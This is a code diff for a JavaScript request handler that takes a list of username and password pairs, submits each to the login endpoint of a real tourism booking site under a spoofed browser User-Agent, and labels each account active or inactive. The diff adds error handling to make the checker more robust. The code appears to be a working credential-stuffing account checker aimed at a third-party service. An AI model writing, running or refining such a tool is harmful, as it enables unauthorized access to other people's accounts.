@@ -7,21 +7,26 @@ export default async function handler(req, res) {
   for (const { username, password } of credentials) {
     const encoded = Buffer.from(`${username}:${password}`).toString("base64");
 
-    const response = await fetch("https://www.irctctourism.com/NewUserlogin/user/loginForIv4", {
-      method: "POST",
-      headers: {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0"
-      },
-      body: JSON.stringify({ data: encoded }),
-    });
+    try {
+      const response = await fetch("https://www.irctctourism.com/NewUserlogin/user/loginForIv4", {
+        method: "POST",
+        headers: {
+          "Accept": "application/json",
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        body: JSON.stringify({ data: encoded }),
+      });
 
-    const data = await response.json();
-    if (data.status === "SUCCESS") {
-      results.push({ username, status: "✅ Active" });
-    } else {
-      results.push({ username, status: "❌ Inactive" });
+      const data = await response.json();
+
+      if (data.status === "SUCCESS") {
+        results.push({ username, status: "✅ Active" });
+      } else {
+        results.push({ username, status: "❌ Inactive" });
+      }
+    } catch (error) {
+      results.push({ username, status: "❌ Error" });
     }
   }
 
